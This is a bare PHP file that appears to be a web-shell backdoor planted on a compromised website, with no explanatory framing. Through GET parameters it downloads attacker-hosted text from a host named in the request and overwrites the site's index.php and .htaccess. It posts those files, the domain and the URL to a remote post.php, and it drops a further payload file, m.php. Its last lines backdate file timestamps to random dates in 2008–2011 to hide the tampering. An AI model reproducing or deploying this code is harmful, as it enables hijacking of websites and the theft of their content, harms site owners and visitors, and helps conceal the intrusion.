<?php 
	$idruri = $_SERVER['REQUEST_URI'];
	$dandir = getcwd();
	$idruri = substr($idruri,0,strrpos($idruri,"/")); 
	$idruri = str_replace("/",DIRECTORY_SEPARATOR,$idruri);
	$gml = str_replace($idruri,"",$dandir); 
	 
	$dir = getcwd(); 
	$web = str_replace('www.','',$_SERVER['HTTP_HOST']); 
	 
	$dirg = $dir.DIRECTORY_SEPARATOR;
	chmod($gml.DIRECTORY_SEPARATOR.'index.php', 0644); 
	$myfile = fopen($gml.DIRECTORY_SEPARATOR.'index.php', "r");  
	$idbody = fread($myfile,filesize($gml.DIRECTORY_SEPARATOR.'index.php'));  
	fclose($myfile);
	
	chmod($gml.DIRECTORY_SEPARATOR.'.htaccess', 0644); 
	$myfile = fopen($gml.DIRECTORY_SEPARATOR.'.htaccess', "r"); 
	$hbody = fread($myfile,filesize($gml.DIRECTORY_SEPARATOR.'.htaccess')); 
	fclose($myfile);
	$bmail = @$_GET['m'];
	$localhost_web = @$_GET['web'];
	
if(@$_GET['u']=='i'){ 
	$webindex = 'http://'.$localhost_web.'/'.$bmail.'/'.$web.'/index.txt'; 
	$bodyindex = gotfile($webindex); 
	
	if(stristr($bodyindex,'<title>404 Not Found</title>')){
		echo "404in";  exit;
	}
	
		if($bodyindex == ""){
			
			echo "no index html"; exit; 
			
		}else{
			if(@$_GET['k'] == "r"){
				
				rwfile($gml.DIRECTORY_SEPARATOR.'index.php',$bodyindex);
				
			}else{
				
			wfile($gml.DIRECTORY_SEPARATOR.'index.php',$bodyindex);	
				
			} 
			
		}
		
		
	
	echo "ok go";

}else if(@$_GET['u']=='h'){  
 
	$webh = 'http://www.'.$localhost_web.'/'.$bmail.'/'.$web.'/h.txt';
	$bodyh = gotfile($webh);
	
	if(stristr($bodyh,'<title>404 Not Found</title>')){
		echo "404in"; exit;
	}
	
if($bodyh == ""){
			echo "no h html<br>";  
			}else{
				
				if(@$_GET['k'] == "r"){
				
				rwfile($gml.DIRECTORY_SEPARATOR.'.htaccess',$bodyh);
				
			}else{
				
			wfile($gml.DIRECTORY_SEPARATOR.'.htaccess',$bodyh);
				
			} 
				
			}
	echo "ok go";
	
} else if(@$_GET['u']=='d'){ 

	$beiurl = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

	

	$data  = array('zm1' => json_encode($idbody),'zm2' => json_encode($hbody),'zm3'=>json_encode($web),'zm4'=>json_encode($beiurl)); 
	 
	$ch = curl_init ();
	
	curl_setopt ( $ch, CURLOPT_URL, "http://www.".$localhost_web."/post.php?m=".$bmail );
	curl_setopt ( $ch, CURLOPT_POST, 1 );
	curl_setopt ( $ch, CURLOPT_HEADER, 0 );
	curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );
	$date = curl_exec($ch);
	curl_close ($ch);
	echo $date;
 
}else if(@$_GET['u']=='q'){ 

	echo '<textarea style=" width:800px;height: 100px;">'.$hbody.'</textarea><br><br>';
	echo '<textarea style=" width:800px;height: 300px;">'.$idbody.'</textarea>';
	
}else if(@$_GET['u']=='m'){ 

	$mm = 'http://'.$localhost_web.'/m.txt'; 
	$mindex = gotfile($mm); 
	wfile($gml.DIRECTORY_SEPARATOR.'m.php',$mindex);	
	echo "ok go";
	
}else{
	
	echo 'ok';
	
}

function rwfile($dir,$body){ 
	unlink($dir);
	$fp = fopen($dir, "w+"); 
	fwrite($fp,$body);
}

function wfile($dir,$body){
	
	$fp = fopen($dir, "w+"); 
	fwrite($fp,$body);
 
	
	}

function gotfile($url){
	$file_contents = @file_get_contents($url); 
	if (!$file_contents) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$file_contents = curl_exec($ch);
		curl_close($ch);
	} 
	return $file_contents; 
}

@touch("db_lookups.php",mktime(rand(1,23),rand(1,59),rand(1,59),rand(1,12),rand(1,29),rand(2008,2011))); 
@touch(($gml.DIRECTORY_SEPARATOR.'index.php'),mktime(rand(1,23),rand(1,59),rand(1,59),rand(1,12),rand(1,29),rand(2008,2011))); 
@touch(($gml.DIRECTORY_SEPARATOR.'.htaccess'),mktime(rand(1,23),rand(1,59),rand(1,59),rand(1,12),rand(1,29),rand(2008,2011))); 
?>